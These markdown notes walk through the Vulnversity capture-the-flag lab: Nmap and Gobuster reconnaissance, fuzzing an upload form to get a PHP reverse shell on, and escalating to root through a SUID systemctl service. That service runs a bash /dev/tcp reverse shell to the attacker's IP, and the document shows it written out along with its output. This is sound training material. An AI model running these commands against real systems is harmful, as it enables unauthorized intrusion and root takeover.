# Offensive Pentesting

[TOC]

## Vulnversity

### Reconnaissance with `Nmap`

- `-sV`: determine the version of services running
- `-p <PORT_NUMBER>`: port scan
- `-p-`: scans for all ports
- `-p1-200`: scans for ports from 1 to 200
- `-Pn`: disable *host discovery* and scan for open ports
- `-A`: enables OS and version detection, executes in-build scripts for further enumeration

### Locating directories using `Gobuster`

- With `Gobuster`, we will locate a directory to which we can use to upload a shell
- Need a wordlist, can find many under `/usr/share/wordlists` in Kali
- `gobuster dir -u <URL> -w <WORDLIST>`
    - `dir` specifies the mode: directory and file enumeration
    - `-u <URL>` the URL of the target web server
    - `-w <WORDLIST>` specifies the wordlist path
- Other flags
    - `-U` and `-P`: specifies the username and password for authentication
    - `-p <x>`: proxy to use for requests
    - `-c <HTTP_COOKIES>`: specifies a cookie for simulating auth
- By default, `gobuster` will only search for 1 layer of directory

### Compromising the Webserver

- After finding a form to upload files, we can leverage it to upload and execute our payload
- Fuzzing the upload form to identify which extensions are not blocked with `BurpSuite`
    - Use intruder (used for automating customised attacks). To begin, make a wordlist with possible extensions

        ```
        .php
        .php3
        .php4
        .php5
        .phtml
        ```
- Then, we upload any file and intercept the request, send it to the intruder, choose `Sniper` as attack type
- In the payload, embrace the file extension (`.*`) with `§`, e.g., `file§.php§`
- Paste the extension list to payload settings, and start attack
- Take care of the `URL-encode these characters` option in "Payload encoding", and do not URL-encode the `.` character

### Getting a Reverse Shell

- Prepare a reverse PHP shell, name it as `php-reverse-shell.phtml`
- Upload this file, listen to port 1234 (`nc -lvnp 1234`), and visit `http://<TARGET_IP>:3333/internal/uploads/php-reverse-shell.phtml`, this will get the payload executed

    ```bash
    # nc -lvnp 1234
    Listening on [0.0.0.0] (family 0, port 1234)
    Connection from 10.10.39.75 47710 received!
    Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
    06:43:12 up 27 min,  0 users,  load average: 0.00, 0.04, 0.07
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    /bin/sh: 0: can't access tty; job control turned off
    $ 
    ```

### Privilege Escalation

- We got a reverse shell, but as an unprivileged user (`www-data`). We will escalate our privileges to become the root user
- Search for Set-UID files: `find / -perm /4000 -type f 2>/dev/null`
- We found Set-UID program `/bin/systemctl`, which can be used to start a service with the root privilege
- Prepare a service `escalation.service`

    ```
    [Unit]
    Description=escalator
    
    [Service]
    Type=simple
    User=root
    ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.35.6/9999 0>&1'

    [Install]
    WantedBy=multi-user.target
    ```
- Find a directory where we are able to write so that we can create the service file, we can use `/dev/shm`: 

    ```shell
    $ find / -maxdepth 2 -type d -writable
    /run/php
    /run/lock
    find: '/lost+found': Permission denied
    /var/tmp
    /var/crash
    /tmp
    /tmp/.font-unix
    /tmp/.ICE-unix
    /tmp/.X11-unix
    /tmp/.XIM-unix
    /tmp/.Test-unix
    /dev/mqueue
    /dev/shm
    find: '/root': Permission denied
    ```

- It is not convenient to edit file (e.g., using `vi`) in the reverse shell, we can prepare the following commands and paste them to the shell

    ```shell
    echo "[Unit]" > /dev/shm/escalation.service
    echo "Description=escalator" >> /dev/shm/escalation.service
    echo "[Service]" >> /dev/shm/escalation.service
    echo "Type=simple" >> /dev/shm/escalation.service
    echo "User=root" >> /dev/shm/escalation.service
    echo "ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.35.6/22222 0>&1'" >> /dev/shm/escalation.service
    echo "[Install]" >> /dev/shm/escalation.service
    echo "WantedBy=multi-user.target" >> /dev/shm/escalation.service
    cat /dev/shm/escalation.service
    ```

- **Important**: on the attack machine, listening to port `22222` before start the service on the victim machine
- Start the service 

    ```shell
    $ /bin/systemctl enable /dev/shm/escalation.service
    Created symlink from /etc/systemd/system/multi-user.target.wants/escalation.service to /dev/shm/escalation.service.
    Created symlink from /etc/systemd/system/escalation.service to /dev/shm/escalation.service.
    $ /bin/systemctl start escalation
    ```

- On the attack machine

    ```shell
    # nc -lvnp 22222
    Listening on [0.0.0.0] (family 0, port 22222)
    Connection from 10.10.39.75 34242 received!
    bash: cannot set terminal process group (2215): Inappropriate ioctl for device
    bash: no job control in this shell
    root@vulnuniversity:/# 
    root@vulnuniversity:/# cat ~/root.txt <-- get the root flag
    ```
